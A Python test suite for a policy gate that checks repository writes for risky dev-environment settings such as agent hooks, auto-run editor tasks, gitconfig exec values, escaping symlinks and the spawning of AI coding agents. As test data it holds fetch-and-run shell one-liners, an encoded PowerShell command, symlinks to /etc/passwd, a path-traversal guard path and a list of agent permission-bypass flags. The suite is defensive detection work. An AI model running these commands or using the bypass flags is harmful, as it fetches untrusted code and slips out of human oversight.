"""agent-devenv-autoexec: the gate script -- exit codes, waivers, cross-references, spawns, symlinks, helpers."""

from __future__ import annotations

import json
import os
from pathlib import Path

import pytest
from policies import scriptkit
from policies.devenvkit import POLICY, SCRIPT, as_json, found, gate, rules

core = gate.sys.modules["devenv.core"]
scan = gate.sys.modules["devenv.scan"]
B, A = "block", "ask"
SETTINGS = ".claude/settings.json"


def hook(command: str) -> str:
    return as_json({"hooks": {"Stop": [{"hooks": [{"type": "command", "command": command}]}]}})


def run(writes: dict, cwd: Path, event: str = "commit", env: dict | None = None) -> tuple[int, dict | None, str]:
    stdin = json.dumps({"event": event, "repo_root": str(cwd), "writes": writes})
    proc = scriptkit.run_script_full(POLICY, SCRIPT, cwd, stdin, env)
    document = json.loads(proc.stdout) if proc.stdout.strip() else None
    return proc.returncode, document, proc.stderr


def test_exit_codes(tmp_path: Path) -> None:
    assert run({"src/a.py": "x"}, tmp_path)[:2] == (0, {"findings": []})
    code, document, stderr = run({SETTINGS: hook("make")}, tmp_path)
    assert code == 1
    assert document["findings"][0]["rule"] == "dev-claude-hooks"
    assert "severity" not in document["findings"][0]
    assert "changed by people" in stderr
    assert run({".vscode/extensions.json": as_json({"recommendations": ["a.b"]})}, tmp_path)[0] == 3


def test_bad_stdin_is_undecided(tmp_path: Path) -> None:
    proc = scriptkit.run_script_full(POLICY, SCRIPT, tmp_path, "not json")
    assert proc.returncode == 2
    assert "could not reach a decision" in proc.stderr


def test_non_text_writes_are_skipped(tmp_path: Path) -> None:
    assert found({SETTINGS: None, "a.py": "x"}, root=tmp_path) == []  # type: ignore[dict-item]


def env_for(**values: str) -> dict:
    clean = {k: v for k, v in os.environ.items() if k not in ("CHOCK_AGENT_COMMIT", "CLAUDECODE", "AI_AGENT")}
    return {**clean, **values}


WAIVED = "[core]\n\tpager = less # chock: allow dev-gitconfig-exec\n\teditor = vim # chock: allow dev-gitconfig-exec\n"


def test_a_persons_waiver_counts_at_commit(tmp_path: Path) -> None:
    repo = scriptkit.init_repo(tmp_path / "r", {"README": "x"})
    scriptkit.write(repo, {".gitconfig": WAIVED})
    scriptkit.git(repo, "add", "-A")
    assert run({".gitconfig": WAIVED}, repo, env=env_for())[0] == 0
    scriptkit.git(repo, "commit", "-q", "-m", "waived")
    assert run({".gitconfig": WAIVED}, repo, event="ci", env=env_for())[0] == 0


def test_an_agent_waiver_counts_only_when_committed(tmp_path: Path) -> None:
    committed = "[core]\n\tpager = less # chock: allow dev-gitconfig-exec\n"
    repo = scriptkit.init_repo(tmp_path / "r", {".gitconfig": committed})
    code, document, _ = run({".gitconfig": WAIVED}, repo, event="tool_use", env=env_for())
    assert code == 1
    assert [f["line"] for f in document["findings"]] == [3]
    moved = WAIVED.replace("pager = less", "pager = ./evil")
    assert [f["line"] for f in run({".gitconfig": moved}, repo, event="tool_use", env=env_for())[1]["findings"]] == [
        2,
        3,
    ]
    assert run({".gitconfig": WAIVED}, repo, env=env_for(CLAUDECODE="1"))[0] == 1
    assert run({".gitconfig": WAIVED}, repo, env=env_for(CHOCK_AGENT_COMMIT="0"))[0] == 0


def test_a_waiver_inside_a_value_does_not_count(tmp_path: Path) -> None:
    text = '{"hooks": {"Stop": [{"hooks": [{"command": "make chock: allow dev-claude-hooks"}]}]}}'
    assert len(found({".cursor/hooks.json": text}, root=tmp_path)) == 1


def test_a_waiver_for_another_rule_or_not_on_a_comment_line_does_not_count(tmp_path: Path) -> None:
    text = "[core]\n\tpager = less # chock: allow dev-gitmodules-untrusted\n\tx = chock: allow dev-gitconfig-exec\n\teditor = vi\n"
    assert len(found({".gitconfig": text}, event="tool_use", root=tmp_path)) == 2


def test_a_waiver_on_the_line_above_does_not_count(tmp_path: Path) -> None:
    text = "[core]\n\t# chock: allow dev-gitconfig-exec\n\tpager = less\n"
    assert len(found({".gitconfig": text}, event="tool_use", root=tmp_path)) == 1


def test_waiver_honoured_in_an_agent_event_without_git(tmp_path: Path) -> None:
    missing = tmp_path / "missing"
    assert len(found({".gitconfig": WAIVED}, event="tool_use", root=missing)) == 2


def test_cross_reference_to_a_written_file() -> None:
    writes = {SETTINGS: hook('bash "$CLAUDE_PROJECT_DIR"/.claude/hooks/x.sh'), ".claude/hooks/x.sh": "exit 0\n"}
    assert sorted(f["rule"] for f in found(writes)) == ["dev-claude-hooks", "dev-cross-reference"]


def test_cross_reference_to_another_agents_folder() -> None:
    text = as_json(
        {
            "version": "2.0.0",
            "tasks": [{"label": "x", "command": "sh .cursor/run.sh", "runOptions": {"runOn": "folderOpen"}}],
        }
    )
    assert sorted(f["rule"] for f in found({".vscode/tasks.json": text})) == [
        "dev-cross-reference",
        "dev-vscode-folderopen",
    ]
    assert [f["rule"] for f in found({".gemini/settings.json": hook("sh .gemini/own.sh tools/x.sh")})] == [
        "dev-claude-hooks"
    ]
    assert [
        f["rule"] for f in found({"lefthook.yml": "pre-commit:\n  commands:\n    a:\n      run: sh .claude/x.sh\n"})
    ] == ["dev-hook-launchers"]


def test_cross_reference_to_an_untracked_file_at_tool_use(tmp_path: Path) -> None:
    repo = scriptkit.init_repo(tmp_path / "r", {"README": "x"})
    scriptkit.write(repo, {"tools/new.sh": "x"})
    assert len(found({SETTINGS: hook("sh tools/new.sh")}, event="tool_use", root=repo)) == 2
    assert len(found({SETTINGS: hook("sh tools/new.sh")}, event="commit", root=repo)) == 1


@pytest.mark.parametrize(
    "line",
    [
        "claude -p x --dangerously-skip-permissions",
        "npx codex exec --dangerously-bypass-approvals-and-sandbox",
        "codex --sandbox danger-full-access",
        "gemini -p x -y",
        "cursor-agent --force -p x",
        "copilot --allow-all-tools",
        "claude --permission-mode=bypassPermissions",
    ],
)
def test_spawns(line: str) -> None:
    assert rules("scripts/run.sh", f"#!/bin/sh\n{line}\n") == [("dev-agent-spawn", B)]


def test_spawn_misses_on_purpose() -> None:
    text = "echo claude-yolo\n./claude --help\ngemini -p x --yes\n"
    assert rules("ci/run.sh", text) == []
    # A comment naming both is reported by the whole-file pass: such a line may sit inside a quoted argument.
    assert [f["key"] for f in found({"ci/run.sh": "# claude --dangerously-skip-permissions\n"})] == [
        "dev-agent-spawn|spawn-file=claude..--dangerously-skip-permissions"
    ]
    assert rules("src/app.py", "claude --yolo\n") == []


def test_symlinks_at_commit_push_and_tool_use(tmp_path: Path) -> None:
    repo = scriptkit.init_repo(tmp_path / "r", {"README": "x"})
    (repo / ".vscode").mkdir()
    (repo / "out").symlink_to("/etc/passwd")
    (repo / "git").symlink_to(".git/config")
    (repo / "in").symlink_to("README")
    (repo / ".vscode" / "tasks.json").symlink_to("../README")
    scriptkit.git(repo, "add", "-A")
    writes = {"out": "/etc/passwd", "git": ".git/config", "in": "README", ".vscode/tasks.json": "../README"}
    at_commit = found(writes, root=repo)
    assert sorted(f["path"] for f in at_commit if f["rule"] == "dev-symlink-escape") == [
        ".vscode/tasks.json",
        "git",
        "out",
    ]
    at_tool_use = found(writes, event="tool_use", root=repo)
    assert sorted(f["path"] for f in at_tool_use if f["rule"] == "dev-symlink-escape") == [
        ".vscode/tasks.json",
        "git",
        "out",
    ]
    scriptkit.git(repo, "commit", "-q", "-m", "links")
    assert len([f for f in found(writes, event="ci", root=repo) if f["rule"] == "dev-symlink-escape"]) == 3
    assert [f for f in found(writes, root=repo, baseline=True) if f["rule"] == "dev-symlink-escape"] == []
    assert scan.symlinks(repo, "commit", {}) == {}


def test_core_helpers() -> None:
    assert core.risky("iwr https://x.example/a | iex") == "fetches and runs code"
    assert core.risky("bash <(curl -s https://x.example)") == "fetches and runs code"
    assert core.risky("eval $(wget -qO- x)") == "fetches and runs code"
    assert core.risky("powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A") == "runs an encoded or inline program"
    assert core.risky("node -e 'x'") == "runs an encoded or inline program"
    assert core.risky("npm ci && make") is None
    assert core.network("rsync a b:")
    assert core.into_repo("${workspaceFolder}") == B
    assert core.into_repo("'./x'") == B
    assert core.into_repo("${workspaceFolder}/node_modules/.bin/x") == A
    long = core.norm("x" * 400)
    assert len(long) < 200
    assert long != core.norm("x" * 401)
    assert core.dotted(()) == "<root>"
    assert core.strings(5) == []
    assert core.strings([]) == []
    assert core.key_of((0,)) == ""


def test_collector_line_of_falls_back_to_the_first_line() -> None:
    c = core.Collector("a\nb\n")
    assert c.line_of("b") == 2
    assert c.line_of("zzz") == 1
    assert c.line_of("a", "zzz") == 1


LAUNCH = (
    'git -c "alias.chock-hook=!test -f .chock/bin/launch.sh || { echo chock: no .chock/bin/launch.sh here, run chock sync'
    ' --repo . >&2; exit 2; }; sh .chock/bin/launch.sh" chock-hook .chock/bin/codex_cli.py'
)


def test_chock_wiring_and_empty_commands_are_not_reported() -> None:
    target = ' --guard ".agents/policies/block-no-verify/implementations/block-no-verify.py"'
    windows = f"& {LAUNCH}{target}; if ($null -eq $LASTEXITCODE) {{ exit 2 }}; exit $LASTEXITCODE"
    text = as_json(
        {"hooks": {"Stop": [{"hooks": [{"command": LAUNCH + target, "commandWindows": windows}, {"command": " "}]}]}}
    )
    assert rules(".codex/hooks.json", text) == []
    assert rules(
        ".codex/hooks.json", hook(LAUNCH + ' --guard ".agents/policies/x/implementations/../../../evil.sh"')
    ) == [("dev-claude-hooks", B)]


def test_yaml_that_hides_values_is_refused() -> None:
    unread = [("dev-unparseable", B)]
    assert rules("lefthook.yml", "pre-commit:\n  parallel: true\n  parallel: false\n") == unread
    assert rules("lefthook.yml", "base: &b {run: x}\npre-commit:\n  <<: *b\n") == unread
    assert rules("lefthook.yml", "pre-commit:\n  parallel: true\n") == []


def test_empty_mcp_file_and_command_less_task() -> None:
    assert rules(".mcp.json", "{}") == []
    assert rules(".vscode/tasks.json", as_json({"tasks": [{"label": "g", "presentation": {"reveal": "always"}}]})) == []


def test_an_overlong_command_is_refused_not_searched() -> None:
    assert core.risky("eval " * 2000) == "is too long to judge"
    assert rules(".envrc", "x" * 9000 + "\n") == [("dev-shell-toolchain", B)]
